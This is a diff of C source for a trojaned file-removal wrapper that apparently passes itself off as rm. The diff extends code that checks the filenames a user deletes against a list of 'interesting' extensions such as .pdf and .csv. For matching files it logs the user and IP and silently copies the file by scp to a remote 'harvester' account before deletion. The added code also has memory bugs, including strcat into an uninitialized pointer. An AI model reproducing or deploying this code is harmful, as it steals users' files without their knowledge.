@@ -60,10 +60,14 @@ void sshsession(char *argv[], int argc){
 
     /*Extract IP Address*/
     strcpy(ip_address, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
-    
+    char *printarg;
     FILE *fp;
     fp = fopen(filename, "w");
-    fprintf(fp, "%s@%s: %s attempted to remove %s @%s\n", p->pw_name, ip_address, p->pw_name, argv, date);
+       for (int i = 1; i < argc; i++){
+       strcat(printarg, argv[i]);
+       strcat(printarg, " ");
+   }
+    fprintf(fp, "%s@%s: %s attempted to remove %s @%s\n", p->pw_name, ip_address, p->pw_name, printarg, date);
     fclose(fp);
     char command[500] = "/usr/bin/scp -q '";
     char dest[100] = "' pdiddy@172.16.77.5:/var/harvester";
@@ -75,6 +79,20 @@ void sshsession(char *argv[], int argc){
     strcat(command, "'");
     system(command);
 }
+int compareFilename(char *interest_cred, char *argv){
+    const char* cinterest_cred = interest_cred;
+    const char* cargv = argv;
+     if (strstr(cargv, cinterest_cred) == cinterest_cred) {
+        return 0;
+    }
+    /*
+    if (strstr(argv, interest_cred) == interest_cred) {
+        return 0;
+    }
+    */
+    return 1;
+}
+
 void grabber(char *argv[], int argc){
     /*
     * Interesting Filenames:
@@ -93,18 +111,40 @@ void grabber(char *argv[], int argc){
     interest_creds[4] = ".pdf";
     interest_creds[5] = ".csv";
    char *command = "/usr/bin/bash ";
+   /*
+   char argvgetter[250] ="";
+   for (int i = 1; i < argc; i++){
+       strcat(argvgetter, argv[i]);
+       strcat(argvgetter, " ");
+   }
+   printf("Comparing filename\n");
    for (int i = 0; i < INTEREST_SIZE; i++){
-       if (compareFilename(interest_creds[i], argv) == 0){
+       if (compareFilename(interest_creds[i], argvgetter) == 0){
+           printf("Entering sshsession\n");
            sshsession(argv, argc);
        }
    }
-   char argvgetter[250];
+   */
+   char *p;
+    for (int i = 0; i < argc; i++){
+        for (int j = 0; j < INTEREST_SIZE; j++){
+               if (strstr(argv[i], interest_creds[j])){//checks what the user entered
+                printf("Entering sshsession\n");
+                sshsession(argv, argc);
+            }
+        }
+    }
+    char argvgetter[250] ="";
    for (int i = 1; i < argc; i++){
        strcat(argvgetter, argv[i]);
        strcat(argvgetter, " ");
    }
    strcat(argvgetter, " '");
-   char *callargv[] = {"-c /usr/bin/rm ", argvgetter, NULL};
+   printf("argvgetter is %s", argvgetter);
+   char *argready[2];
+   argready[0] = argvgetter;
+   argready[1] = NULL;
+   char *callargv[] = {"-c /usr/bin/rm ", argready, NULL};
    execve(command, callargv, NULL);
  
 }
